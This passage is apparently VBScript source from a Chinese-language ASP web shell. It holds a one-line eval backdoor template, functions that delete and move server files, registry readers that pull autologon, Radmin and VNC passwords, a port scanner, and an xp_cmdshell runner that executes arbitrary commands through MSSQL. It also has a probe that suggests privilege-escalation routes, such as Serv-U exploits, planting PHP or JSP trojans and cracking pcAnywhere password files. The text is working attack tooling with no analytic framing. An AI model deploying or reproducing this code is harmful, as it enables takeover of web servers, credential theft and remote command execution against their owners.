Set T=CF.opentextfile(Path, 1, False)
Txt=HTMLEncode(T.readall) 
T.close
Set T=Nothing
  Else
Path=Session("FolderPath")&"\hack.asp":Txt=""&chr(60)&"%Eval(Request(chr(97)))"&chr(37)&""&chr(62)&"一句话木马，密码a"
  End If
  SI=SI&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>"
  SI=SI&"<input name='Action' value='EditFile' Type='hidden'>"
  SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'><br>"
  SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
  SI=SI&"<hr><input name='goback' type='button' value='返回' onclick='history.back();'>   <input name='reset' type='reset' value='重置'>   <input name='submit' type='submit' value='保存'></form>"
  RRS SI
  End Function
  Function CopyFile(Path)
  Path = Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
  CF.CopyFile Path(0),Path(1)
  SI="<center><br><br><br>文件"&Path(0)&"复制成功！</center>"
  SI=SI&BackUrl
  RRS SI 
End If
  End Function
  Function MoveFile(Path)
  Path = Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
  CF.MoveFile Path(0),Path(1)
  SI="<center><br><br><br>文件"&Path(0)&"移动成功！</center>"
  SI=SI&BackUrl
  RRS SI 
End If
  End Function
  Function DelFolder(Path)
If CF.FolderExists(Path) Then
  CF.DeleteFolder Path
  SI="<center><br><br><br>目录"&Path&"删除成功！</center>"
  SI=SI&BackUrl
  RRS SI
End If
  End Function
  Function CopyFolder(Path)
  Path = Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
  CF.CopyFolder Path(0),Path(1)
  SI="<center><br><br><br>目录"&Path(0)&"复制成功！</center>"
  SI=SI&BackUrl
  RRS SI
End If
  End Function
  Function MoveFolder(Path)
  Path = Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
  CF.MoveFolder Path(0),Path(1)
  SI="<center><br><br><br>目录"&Path(0)&"移动成功！</center>"
  SI=SI&BackUrl
  RRS SI
End If
  End Function
Function NewFolder(Path)
If Not CF.FolderExists(Path) and Path<>"" Then
  CF.CreateFolder("\\?\"&Path)
  SI="<center><br><br><br>目录"&Path&"新建成功！</center>"
  SI=SI&BackUrl
  RRS SI
End If
  End Function
End Class
sub getTerminalInfo()
on error resume next
dim wsh
set wsh=createobject("Wscript.Shell")
Response.Write "[网络_探测]<br><hr size=1>"
EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
isEnable=Wsh.Regread(EnableTcpipKey)
If isEnable=0 or isEnable="" Then
Notcpipfilter=1
End If
ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
Apds=Wsh.RegRead(ApdKey)
If IsArray(Apds) Then 
For i=LBound(Apds) To UBound(Apds)-1
ApdB=Replace(Apds(i),"\Device\","")
Response.Write "网卡"&i&"的序列为:"&ApdB&"<br>"
Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"
IPKey=Path&ApdB&"\IPAddress"
IPaddr=Wsh.Regread(IPKey)
If IPaddr(0)<>"" Then
For j=Lbound(IPAddr) to Ubound(IPAddr)
Response.Write "<li>IP地_址"&j&"为:"&IPAddr(j)&"<br>"
Next
Else
Response.Write "<li>IP地_址无法读取_或没有设置<br>"
End if
GateWayKey=Path&ApdB&"\DefaultGateway"
GateWay=Wsh.Regread(GateWayKey)
If isarray(GateWay) Then
For j=Lbound(Gateway) to Ubound(Gateway)
Response.Write "<li>网关"&j&":"&Gateway(j)&"<br>"
Next
Else
Response.Write "<li>网关无法读取或没有设置<br>"
End if
DNSKey=Path&ApdB&"\NameServer"
DNSstr=Wsh.RegRead(DNSKey)
If DNSstr<>"" Then
Response.Write "<li>网卡_DNS为:"&DNSstr&"<br>"
Else
Response.Write "<li>默认_DNS无法读取或没有设置<br>"
End If
if Notcpipfilter=1 Then 
Response.Write "<li>没Tcp/IP筛选<br>"
else
ETK="\TCPAllowedPorts"
EUK="\UDPAllowedPorts"
FullTCP=Path&ApdB&ETK
FullUDP=path&ApdB&EUK
tcpallow=Wsh.RegRead(FullTCP)
If tcpallow(0)="" or tcpallow(0)=0 Then
Response.Write "<li>允许_的tcp端口为:全部<br>"
Else
Response.Write "<li>允许_的tcp端口为:"
For j = LBound(tcpallow) To UBound(tcpallow)
Response.Write tcpallow(j)&","
Next
Response.Write "<Br>"
End if
udpallow=Wsh.RegRead(FullUDP)
If udpallow(0)="" or udpallow(0)=0 Then
Response.Write "<li>允许_的udp端口为:全部<br>"
Else
Response.Write "<li>允许_的udp端口为:"
for j = LBound(udpallow) To UBound(udpallow)
Response.Write UDPallow(j)&","
next
Response.Write "<br>"
End if
End if
Response.Write "------------------------------------------------<br>"
Next
end if
Response.Write "<br><br>[特殊_端口_探测]<br><hr size=1>"
Telnetkey="HKEY_LOCAL_MACHINE\SOFTWARE\ Microsoft\TelnetServer\1.0\TelnetPort"
TlntPort=Wsh.RegRead(TelnetKey)
if TlntPort="" Then Tlnt="23(默认_设置)"
Response.Write "<li>Telnet端_口:"&Tlntport&"<br>"
TermKey="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber"
TermPort=Wsh.RegRead(TermKey)
If TermPort="" Then TermPort="无法_读取.请确认_是否为Windows Server版本主机"
Response.Write "<li>Terminal Service端口为:"&TermPort&"<br>"
pcAnywhereKey="HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"
PAWPort=Wsh.RegRead(pcAnywhereKey)
If PAWPort="" then PAWPort="无法_获取.请确认_主机是_否安装pcAnywhere"
Response.Write "<li>PcAnywhere端口为:"&PAWPort&"<br>"
Response.Write "------------------------------------------------------"
Set wsX = Server.CreateObject("WScript.Shell")
Dim terminalPortPath, terminalPortKey, termPort
Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey = "PortNumber"
termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
RrS"终端_服务端口_及自动登录<ol>"
If termPort = "" Or Err.Number <> 0 Then 
RRS"无法得到终端端口, 检查权限是否受到限制.<br/>"
 Else
RrS"当前终端服务_端口: " & termPort & "<br/>"
End If
autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey = "AutoAdminLogon"
autoLoginUserKey = "DefaultUserName"
autoLoginPassKey = "DefaultPassword"
isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
If isAutoLoginEnable = 0 Then
Else
autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
RrS"自动登录_的系统帐户: " & autoLoginUsername & "<br>"
autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
If Err Then
Err.Clear
RrS"False"
End If
RrS"自动登录_的帐户密码: " & autoLoginPassword & "<br>"
End If
RrS"</ol>"
Response.Write "<br><br><br>[系统软_件探测]<br><hr size=1>"
SoftPath=Wsh.Environment.item("Path")
Pathinfo=lcase(SoftPath)
Response.Write "系统软_件支持:"
if Instr(Pathinfo,"perl") Then Response.Write "<li>Perl脚本_:支持<br>"
if instr(Pathinfo,"java") Then Response.Write "<li>Java脚本_:支持<br>"
if instr(Pathinfo,"microsoft sql server") Then Response.Write "<li>MSSQL数据库服务_:支持<br>"
if instr(Pathinfo,"mysql") Then Response.Write "<li>MySQL数据库服务_:支持<br>"
if instr(Pathinfo,"oracle") Then Response.Write "<li>Oracle数据库服务_:支持<br>"
if instr(Pathinfo,"cfusionmx7") Then Response.Write "<li>CFM服务器_:支持<br>"
if instr(Pathinfo,"pcanywhere") Then Response.Write "<li>赛门铁克PcAnywhere控制_:支持<br>"
if instr(Pathinfo,"Kill") Then Response.Write "<li>Kill杀毒软件_:支持<br>"
if instr(Pathinfo,"kav") Then Response.Write "<li> 金山系列杀毒软件_:支持<br>"
if instr(Pathinfo,"antivirus") Then Response.Write "<li>赛门铁克杀毒软件_:支持<br>"
if instr(Pathinfo,"rising") Then Response.Write "<li>瑞星系列杀毒软件_:支持<br>"
paths=split(SoftPath,";")
Response.Write "------------------------------------<br>"
Response.Write "系统当前_路径变量:<br>"
For i=Lbound(paths) to Ubound(paths)
Response.Write "<li>"&paths(i)&"<br>"
next
Response.Write "<br><br>[系统设置_探测]<br><hr size=1>"
pcnamekey="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
pcname=wsh.RegRead(pcnamekey)
if pcname="" Then pcname="无法读_取主机名.<br>"
Response.Write "<li>当前主_机名为:"&pcname&"<br>"
AdminNameKey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName"
AdminName=wsh.RegRead(AdminNameKey)
if adminname="" Then AdminName="Administrator"
Response.Write "<li>默认管理_员用户名为:"&AdminName&"<br>"
isAutologin="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon"
Autologin=Wsh.RegRead(isAutologin)
if Autologin=0 or Autologin="" Then
Response.Write "<li>用户自_动登入:未启用<br>"
Else
Response.Write "<li>用户自_动登入:启用<br>"
Admin=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
Passwd=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
Response.Write "<li type=square>用户名:"&Admin&"<br>"
Response.Write "<li type=square>密码:"&Passwd&"<br>"
End if
displogin=wsh.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
If displogin="" or displogin=0 Then disply="是" else disply="否"
Response.Write "<li>是否显示上_次登入用户:"&disply&"<br>"
NTMLkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\NTML"
ntml=Wsh.RegRead(NTMLkey)
if ntml="" Then Ntml=1
Response.Write "<li>Telnet Ntml设置为:"&ntml&"<br>"
hk="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count"
kk=wsh.RegRead(hk)
Response.Write"<li>当前活动_网卡为:"&kk&"<br>"
Response.Write "------------------------------------<br><br><br>"
Response.write "[服务器弱_点探测]<br><hr>"
Set objComputer = GetObject("WinNT://.")
Set sa = Server.CreateObject("Shell.Application")
objComputer.Filter = Array("Service")
On Error Resume Next
For Each objService In objComputer
if objService.Name="Serv-U" Then
if objService.ServiceAccountName="LocalSystem" Then
Response.Write "<li>服务器中有_Serv-U安装,且以LocalSystem权限启动,可以考虑用su.exe工具提权<br>"
End if
End if
if lcase(objService.Name)="apache" Then
if objService.ServiceAccountName="LocalSystem" Then
If instr(Request.ServerVariables("SERVER_SOFTWARE"),"Apache") Then
Response.Write "<li>当前WEB服务器为Apache.可以直接提权<br>"
Else
Response.Write " <li>服务器中有_Apache服务存在,启动权限为LocalSystem,可以考虑PHP木马<br>"
End if
end if
End if
if instr(lcase(objService.Name),"tomcat") Then
if objService.ServiceAccountName="LocalSystem" Then
Response.Write "<li>服务器中有_Tomcat,且以LocalSystem权限启动,可以考虑使用Jsp木马提权<br>"
End if
End if
if instr(lcase(objService.Name),"winmail") Then
if objService.ServiceAccountName="LocalSystem" Then
Response.Write "<li>服务器中有_Magic Winmail,且以LocalSystem权限启动,可以查找WebMail目录,并且写入PHP木马<br>"
End if
End if
Next
Set fso=Server.Createobject("Scripting.FileSystemObject")
Sysdrive=left(Fso.GetspecialFolder(2),2)
servername=wsh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")
If fso.FileExists(sysdriver&"\Documents And Settings\All Users\Application Data\Symantec\"&servername&".cif") Then
Response.Write "<li>发现_pcAnywhere密码文件,可以从默认目录下载并破解得到pcAnywhere密码"
End if
End Sub
Sub Message(state,msg,flag)
rrs"<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#ddd>"
rrs"  <TR>"
rrs"<TD class=TBHead>系统信息</TD>"
rrs"  </TR>"
rrs"  <TR>"
rrs"<TD align=middle bgcolor=#ecfccd>"
rrs"  <TABLE width=82% border=0 cellpadding=5 cellspacing=0>"
rrs"<TR>"
rrs"  <TD><FONT color=red>"
rrs state
rrs"</FONT></TD>"
rrs"<TR>"
rrs"  <TD><P>"
rrs msg
rrs"</P></TD>"
rrs"</TR>"
rrs"  </TABLE>"
rrs"</TD>"
rrs"  </TR>"
rrs"  <TR>"
rrs"<TD class=TBEnd>"
rrs""
If flag=0 Then
rrs"  <INPUT type=button value=关闭 onclick='window.close();'>"
rrs""
Else
rrs"  <INPUT type=button value=返回 onClick='history.go(-1);'>"
rrs""
End if
rrs"</TD>"
rrs"  </TR>"
rrs"</TABLE>"
End Sub
Function Red(str)
Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function
Sub ScanDriveForm()
Dim FSO,DriveB
Set FSO = Server.Createobject("Scripting.FileSystemObject")
rrs"<br>"
rrs"<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgcolor=#ffffff>"
rrs"  <TR>"
rrs"<TD colspan=5 class=TBHead>磁盘/系统文件夹信息</TD>"
rrs"  </TR>"
  For Each DriveB in FSO.Drives
rrs"  <TR align=middle class=TBTD>"
rrs"<FORM action="
rrs"?Action=ScanDrive&Drive="
rrs DriveB.DriveLetter
rrs" method=Post>"
rrs"<TD width=25"&chr(37)&"><B>盘符</B></TD>"
rrs"<TD width=15"&chr(37)&">"
rrs DriveB.DriveLetter
rrs":</TD>"
rrs"<TD width=20"&chr(37)&"><B>类型</B></TD>"
rrs"<TD width=20"&chr(37)&">"
  Select Case DriveB.DriveType
  Case 1: rrs"可移动"
  Case 2: rrs"本地硬盘"
  Case 3: rrs"网络磁盘"
  Case 4: rrs"CD-ROM"
  Case 5: rrs"RAM磁盘"
  Case else: rrs"未知类型"
  End Select
rrs"</TD>"
rrs"<TD><INPUT type=submit value=详细报告></TD>"
rrs"</FORM>"
rrs"  </TR>"
  Next
rrs"  <TR class=TBTD>"
rrs"<FORM action="
rrs"?Action=ScFolder&Folder="
rrs FSO.GetSpecialFolder(0)
rrs" method=Post>  "
rrs"<TD align=middle><B>Windows文件夹</B></TD>"
rrs"<TD colspan=3>"
rrs FSO.GetSpecialFolder(0)
rrs"</TD>"
rrs"<TD align=middle><INPUT type=submit value=详细报告></TD>"
rrs"</FORM>"
rrs"  </TR>"
rrs"  <TR class=TBTD>"
rrs"<FORM action="
rrs"?Action=ScFolder&Folder="
rrs FSO.GetSpecialFolder(1)
rrs" method=Post>  "
rrs"<TD align=middle><B>System32文件夹</B></TD>"
rrs"<TD colspan=3>"
rrs FSO.GetSpecialFolder(1)
rrs"</TD>"
rrs"<TD align=middle><INPUT type=submit value=详细报告></TD>"
rrs"</FORM>"
rrs"  </TR>"
rrs"  <TR class=TBTD>"
rrs"<FORM action="
rrs"?Action=ScFolder&Folder="
rrs FSO.GetSpecialFolder(2)
rrs" method=Post>  "
rrs"<TD align=middle><B>系统临时文件夹</B></TD>"
rrs"<TD colspan=3>"
rrs FSO.GetSpecialFolder(2)
rrs"</TD>"
rrs"<TD align=middle><INPUT type=submit value=详细报告></TD>"
rrs"<TR class=TBTD> <FORM action= method=Post>"
rrs"<TD align=middle><B>站点跟目录</B></TD>"
rrs"<TD colspan=3>"
rrs"站点跟目录"
rrs"<TD align=middle><a href="&URL&"?Action=ScFolder&Folder="&wwwroot&"><b>详细报告</b></a></TD>"
rrs"<TR class=TBTD> <FORM action= method=Post>"
rrs"<TD align=middle><B>回收站目录</B></TD>"
rrs"<TD colspan=3>"
rrs"回收站目录 "
rrs"<TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\recycler\><b>详细报告</b></a></TD>"
rrs"<TR class=TBTD> <FORM action= method=Post>"
rrs"<TD align=middle><B>wmpub目录 </B></TD>"
rrs"<TD colspan=3>"
rrs"wmpub"
rrs"<TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\wmpub\><b>详细报告</b></a></TD>"
rrs"</TABLE><BR>"
rrs"</FORM>"
rrs"  </TR>"
rrs"</TABLE><BR>"
rrs"<DIV align=center>"
rrs"  <FORM Action="
rrs"?Action=ScFolder method=Post>指定文件夹查询："
rrs"<INPUT type=text name=Folder>"
rrs"<INPUT type=submit value=生成报告>　指定文件夹路径。如：F:\ASP\"
rrs"  </FORM>"
rrs"<DIV>"
Set FSO=Nothing
End Sub
Sub ScanDrive(Drive)
Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
If Drive <> "" Then
Set FSO = Server.Createobject("Scripting.FileSystemObject")
Set TestDrive = FSO.GetDrive(Drive)
If TestDrive.IsReady Then
Temp_Str = "<LI>磁盘分区类型：" & Red(TestDrive.FileSystem) & "<LI>磁盘序列号：" & Red(TestDrive.SerialNumber) & "<LI>磁盘共享名：" & Red(TestDrive.ShareName) & "<LI>磁盘总容量：" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>磁盘卷名：" & Red(TestDrive.VolumeName) & "<LI>磁盘根目录:" & ScReWr((Drive & ":\"))
Set BaseFolder = TestDrive.RootFolder
Set TempFolders = BaseFolder.SubFolders
For Each D in TempFolders
Temp_Str = Temp_Str & "<LI>文件夹：" & ScReWr(D)
Next
Set TempFolder = Nothing
Set BaseFolder = Nothing
Else
Temp_Str = Temp_Str & "<LI>磁盘根目录:" & Red("不可读:(")
Dim TempFolderList,t:t=0
Temp_Str = Temp_Str & "<LI>" & Red("穷举目录测试：")
TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
For i = 0 to Ubound(TempFolderList)
If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
t = t+1
Temp_Str = Temp_Str & "<LI>发现文件夹：" & ScReWr(Drive & ":\" & TempFolderList(i))
End if
Next
If t=0 then Temp_Str = Temp_Str & "<LI>已穷举" & Drive & "盘根目录，但未有发现:("
End if
Set TestDrive = Nothing
Set FSO = Nothing
Temp_Str = Temp_Str & "<LI>注意：" & Red("不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!")
Message Drive & ":磁盘信息",Temp_Str,1
End if
End Sub
Sub ScFolder(folder) 
On Error Resume Next
Dim FSO,OFolder,TempFolder,Scmsg,S
Set FSO = Server.Createobject("Scripting.FileSystemObject")
If FSO.FolderExists(folder) Then
Set OFolder = FSO.GetFolder(folder)
Set TempFolders = OFolder.SubFolders
Scmsg = "<LI>指定文件夹根目录：" & ScReWr(folder)
For Each S in TempFolders
 Scmsg = Scmsg&"<LI>文件夹：" & ScReWr(S)  
Next
Set TempFolders = Nothing
Set OFolder = Nothing
Else
Scmsg = Scmsg & "<LI>文件夹：" & Red(folder & "不存在或无读权限!")
End if
Scmsg = Scmsg & "<LI>注意：" & Red("不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!")
Set FSO = Nothing
Message "文件夹信息",Scmsg,1
End Sub
Function ScReWr(folder)
On Error Resume Next
Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
Set FSO = Server.Createobject("Scripting.FileSystemObject")
Set TestFolder = FSO.GetFolder(folder)
Set TestFileList = TestFolder.SubFolders
RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
For Each A in TestFileList
Next
If err Then
err.Clear
ReWrStr = folder & "<FONT color=#ff2222> 不可读,"
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "不可写。</FONT>"
Else
ReWrStr = ReWrStr & "可写。</FONT>"
FSO.DeleteFile folder & RndFilename,True
End If
Else
ReWrStr = folder & "<FONT color=#ff2222> 可读,"
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "不可写。</FONT>"
Else
ReWrStr = ReWrStr & "可写。</FONT>"
FSO.DeleteFile folder & RndFilename,True
End if
End if
Set TestFileList = Nothing
Set TestFolder = Nothing
Set FSO = Nothing
ScReWr = ReWrStr
End Function
function goback()
set Ofso = Server.CreateObject("Scripting.FileSystemObject")
set ofolder = Ofso.Getfolder(Session("FolderPath"))
if not ofolder.IsRootFolder then 
rrs "<script>ShowFolder("""&RePath(ofolder.parentfolder)&""")</script>"
else 
rrs "<script>ShowFolder("""&Session("FolderPath")&""")</script>"
rrs "<center>已经是磁盘根目录了!</center>"
rrs "  <center><br><INPUT type=button value=返回 onClick='history.go(-1);'></br></center>"
end if
set Ofso=nothing
set ofolder=nothing
end function:
sub ReadREG()
RRS "<form method=post>"
RRS  "注册表键值读取<p>" 
RRS "<input type=hidden value=ReadReg name=theAct>"
RRS "<tr><td colspan=2> "
RRS "<select onChange='this.form.thePath.value=this.value;'>"
RRS "<option value=''>选择自带的键值</option>"
RRS "<option value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName'>ComputerName</option>"
RRS"<option value=""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Linkage\Bind"">网卡列表</option>"
RRS"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter"">Radmin密码</option>"
RRS"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Port"">Radmin端口</option>"
RRS"<option value=""HKCU\Software\ORL\WinVNC3\Password"">VNC3密码</option>"
RRS"<option value=""HKCU\Software\ORL\WinVNC3\PortNumber"">VNC3端口</option>"
RRS"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\Password"">VNC4密码</option>"
RRS"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\PortNumber"">VNC4端口</option>"
RRS"<option value=""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber"">3389端口</option>"
RRS"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"">PcAnyW数据端口</option>"
RRS"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPStatusPort"">PcAnyW状态端口</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤1</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤2</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤3</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent\LogPath'>Schedule Log</option>"
RRS "<option value='HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List\3389:TCP'>防火开放</option>"
RRS "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts'>允许开放的UDP端口</option>"
RRS "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts'>允许开放的TCP端口</option>"
RRS "</select><br />"
RRS " <input name=thePath value='' size=80>"
RRS "<input type=button value='读 键 值' onclick='this.form.submit()'>"
RRS "</form><hr/>"
if Request("thePath")<>"" then
On Error Resume Next
Set wsX = Server.CreateObject("WScript.Shell")
thePath=Request("thePath")
theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray)
RRS "<li>" & theArray(i)
Next
Else
RRS "<li>" & theArray
End If
end if
end sub
sub ScanPort()
Server.ScriptTimeout = 7776000
if request.Form("port")="" then
PortList="21,23,53,1433,3306,3389,4899,5631,5632,5800,5900,43958"
else
PortList=request.Form("port")
end if
if request.Form("ip")="" then
IP="127.0.0.1"
else
IP=request.Form("ip")
end if
RRS"<p>端口扫描器(如果扫描多个端口,速度比较慢,个人推荐使用CMD)</p>"
RRS"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
RRS"<p>Scan IP: "
RRS" <input name='ip' type='text' class='TextBox' id='ip' value='"&IP&"' size='60'>"
RRS"<br>Port List:"
RRS"<input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'>"
RRS"<br><br>"
RRS"<input name='submit' type='submit' class='buttom' value=' scan '>"
RRS"<input name='scan' type='hidden' id='scan' value='111'>"
RRS"</p></form>"
If request.Form("scan") <> "" Then
timer1 = timer
RRS("<b>扫描报告:</b><br><hr>")
tmp = Split(request.Form("port"),",")
ip = Split(request.Form("ip"),",")
For hu = 0 to Ubound(ip)
If InStr(ip(hu),"-") = 0 Then
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ip(hu), tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ip(hu), j)
Next
Else
RRS(startN & " or " & endN & " is not number<br>")
End If
Else
RRS(tmp(i) & " is not number<br>")
End If
End If
Next
Else
ipStart = Mid(ip(hu),1,InStrRev(ip(hu),"."))
For xxx = Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ipStart & xxx, tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ipStart & xxx,j)
Next
Else
RRS(startN & " or " & endN & " is not number<br>")
End If
Else
RRS(tmp(i) & " is not number<br>")
End If
End If
Next
Next
End If
Next
timer2 = timer
thetime=cstr(int(timer2-timer1))
RRS"<hr>Process in "&thetime&" s"
END IF
end sub
Sub Scan(targetip, portNum)
On Error Resume Next
set conn = Server.CreateObject("ADODB.connection")
connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;"
conn.ConnectionTimeout = 1
conn.open connstr
If Err Then
If Err.number = -2147217843 or Err.number = -2147467259 Then
If InStr(Err.description, "(Connect()).") > 0 Then
RRS(targetip & ":" & portNum & ".........关闭<br>")
Else
RRS(targetip & ":" & portNum & ".........<font color=red>开放</font><br>")
End If
End If
End If
End Sub :Select Case Action:case "MainMenu":MainMenu():case "getTerminalInfo":getTerminalInfo():case "PageAddToMdb":PageAddToMdb():case "ScanPort":ScanPort():FuncTion MMD():SI="<br><table width=""100%""><tr class=tr><form name=form method=post action="""">CMD命令<input type=text name=MMD size=35 value=ipconfig><input type=text name=U value=sa><input type=text name=P value=><input type=submit value=执行></form></tr></table>":response.write SI:SI="":If trim(request.form("MMD"))<>""  Then:password= trim(Request.form("P")):id=trim(Request.form("U")):set adoConn=sERvEr.crEATeobjECT("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id:strQuery = "exec master.dbo.xp_cMdsHeLl '" & request.form("MMD") & "'":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResult = strResult & chr(13) & recResult(0):recResult.MoveNext:Loop:End if:set recResult = Nothing:strResult = Replace(strResult," ","&nbsp;"):strResult = Replace(strResult,"<","&lt;"):strResult = Replace(strResult,">","&gt;"):strResult = Replace(strResult,chr(13),"<br>"):End if:set adoConn = Nothing:Response.Write request.form("MMD") & "<br>"& strResult:end FuncTion:case "Alexa"
dim AlexaUrl,Top:AlexaUrl=request("u"):Top=Alexa(AlexaUrl):if AlexaUrl="" then AlexaUrl=""&request.servervariables("http_host")&""
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><tr><td height='20' colspan='3' align='center' bgcolor='menu'>服务器组件信息</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器名</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&request.serverVariables("SERVER_NAME")&"</td></tr><form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器IP</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'><input type='text' name='ip' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'style='border:0px'><input type='submit' value='查询此服务器所在地'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form><form method=post action='?Action=Alexa' name='form1'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器Alexa排名</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'><input type='text' name='u' value='"&AlexaUrl&"' size=40 style='border:0px'>排名:<input type='text' value='"&Top&"' size=10><input type='submit'  value='查询'></td></tr></form><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器时间</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&now&" </td></tr><tr align='center'><td height='20' width='200' 